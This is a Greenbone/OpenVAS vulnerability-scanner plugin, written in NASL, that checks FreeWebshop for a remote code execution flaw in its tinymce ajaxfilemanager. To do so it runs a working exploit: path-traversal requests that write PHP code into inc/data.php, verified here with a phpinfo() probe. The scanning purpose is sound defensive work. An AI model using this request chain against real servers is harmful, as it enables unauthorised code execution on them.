CPE = "cpe:/a:freewebshop:freewebshop";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103341" );
	script_bugtraq_id( 50694, 34538 );
	script_cve_id( "CVE-2011-5147", "CVE-2009-2338" );
	script_version( "$Revision: 10292 $" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_name( "FreeWebshop 'ajax_save_name.php' Remote Code Execution Vulnerability" );
	script_tag( name: "last_modification", value: "$Date: 2018-06-22 05:53:38 +0200 (Fri, 22 Jun 2018) $" );
	script_tag( name: "creation_date", value: "2011-11-17 08:34:17 +0100 (Thu, 17 Nov 2011)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "FreeWebShop_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "FreeWebshop/installed" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/50694" );
	script_xref( name: "URL", value: "http://www.freewebshop.org" );
	script_tag( name: "summary", value: "FreeWebshop is prone to a remote code-execution vulnerability because the
  application fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue will allow attackers to execute arbitrary code within
  the context of the affected application." );
	script_tag( name: "affected", value: "FreeWebshop 2.2.9 R2 is vulnerable, prior versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
func random_mkdir( dir, port, host ){
	var payload;
	dirname = "openvas-" + rand();
	payload = "new_folder=" + dirname + "&currentFolderPath=../../../up/";
	req = "POST " + dir + "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.1\\r\\n" + "Host: " + host + "\\r\\n" + "Content-Length: " + strlen( payload ) + "\\r\\n" + "Content-Type: application/x-www-form-urlencoded\\r\\n" + "\\r\\n" + payload;
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!IsMatchRegexp( result, "HTTP/1.. 200" ) || !ContainsString( result, dirname )){
		exit( 0 );
	}
	return dirname;
}
func exploit( ex, dir, port, host ){
	payload = "selectedDoc[]=" + ex + "&currentFolderPath=../../../up/";
	req = NASLString( "POST ", dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_file_cut.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "\\r\\n", payload );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!IsMatchRegexp( result, "HTTP/1.. 200" )){
		exit( 0 );
	}
	session_id = eregmatch( pattern: "Set-Cookie: ([^;]*);", string: result );
	if(isnull( session_id[1] )){
		exit( 0 );
	}
	sess = session_id[1];
	dirname = random_mkdir( dir: dir, port: port, host: host );
	newname = rand();
	payload = "value=" + newname + "&id=../../../up/" + dirname;
	req = NASLString( "POST ", dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", sess, "\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "\\r\\n", payload );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!ContainsString( result, "path" ) || !ContainsString( result, newname )){
		exit( 0 );
	}
	url = NASLString( dir, "/addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php" );
	req = http_get( item: url, port: port );
	buf = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(buf == NULL){
		exit( 0 );
	}
	return buf;
}
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: port );
buf = exploit( ex: "<?php phpinfo(); die; ?>", dir: dir, port: port, host: host );
if(ContainsString( buf, "<title>phpinfo()" )){
	exploit( ex: "", dir: dir, port: port, host: host );
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

